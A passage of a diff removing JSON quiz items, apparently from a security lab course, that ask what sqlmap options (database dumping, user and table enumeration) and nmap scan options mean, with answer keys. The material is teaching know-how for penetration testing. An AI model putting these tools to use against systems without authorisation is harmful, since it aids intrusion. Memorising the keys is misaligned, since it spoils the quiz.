-    "question": "Choose the correct meaning of sqlmap option `--dump`:",
-    "options": {
-      "A": "List columns for a table (requires -D and -T)",
-      "B": "Retrieve current DB user",
-      "C": "Set HTTP referer header",
-      "D": "Dump table data"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 285,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--current-user`:",
-    "options": {
-      "A": "Set HTTP referer header",
-      "B": "Check if current user is DBA",
-      "C": "Retrieve current DB user",
-      "D": "List columns for a table (requires -D and -T)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 286,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--is-dba`:",
-    "options": {
-      "A": "Retrieve current DB user",
-      "B": "Check if current user is DBA",
-      "C": "List database names",
-      "D": "List tables for a DB (requires -D)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 287,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--tables`:",
-    "options": {
-      "A": "List tables for a DB (requires -D)",
-      "B": "Retrieve current DB user",
-      "C": "List database names",
-      "D": "Set HTTP referer header"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 288,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--columns`:",
-    "options": {
-      "A": "Set HTTP referer header",
-      "B": "Dump table data",
-      "C": "List tables for a DB (requires -D)",
-      "D": "List columns for a table (requires -D and -T)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 289,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--method=POST`:",
-    "options": {
-      "A": "List database names",
-      "B": "Force HTTP method to POST",
-      "C": "Check if current user is DBA",
-      "D": "Set HTTP referer header"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 290,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--data`:",
-    "options": {
-      "A": "Dump table data",
-      "B": "List database names",
-      "C": "Send parameters in the request body",
-      "D": "List tables for a DB (requires -D)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 291,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--cookie`:",
-    "options": {
-      "A": "List database names",
-      "B": "Send session cookies",
-      "C": "List tables for a DB (requires -D)",
-      "D": "Check if current user is DBA"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 292,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--referer`:",
-    "options": {
-      "A": "Retrieve current DB user",
-      "B": "Set HTTP referer header",
-      "C": "Check if current user is DBA",
-      "D": "Dump table data"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 293,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sn`:",
-    "options": {
-      "A": "OS detection",
-      "B": "No DNS resolution",
-      "C": "SYN scan (default when root)",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 294,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-n`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "No DNS resolution",
-      "C": "ICMP timestamp request discovery",
-      "D": "Idle/Zombie scan"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 295,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-PP`:",
-    "options": {
-      "A": "ICMP timestamp request discovery",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "No DNS resolution",
-      "D": "Aggressive (-sV, -O, scripts, traceroute)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 296,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sS`:",
-    "options": {
-      "A": "OS detection",
-      "B": "SYN scan (default when root)",
-      "C": "No DNS resolution",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 297,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sT`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "Idle/Zombie scan",
-      "C": "XMAS scan (FIN/PSH/URG)",
-      "D": "OS detection"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 298,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sX`:",
-    "options": {
-      "A": "XMAS scan (FIN/PSH/URG)",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "Treat host as up (skip ping)",
-      "D": "Aggressive (-sV, -O, scripts, traceroute)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 299,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sV`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "OS detection",
-      "C": "Service version detection",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 300,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-O`:",
-    "options": {
-      "A": "OS detection",
-      "B": "SYN scan (default when root)",
-      "C": "Host discovery only (no port scan)",
-      "D": "Idle/Zombie scan"
     },
     "correct": [
       "A"
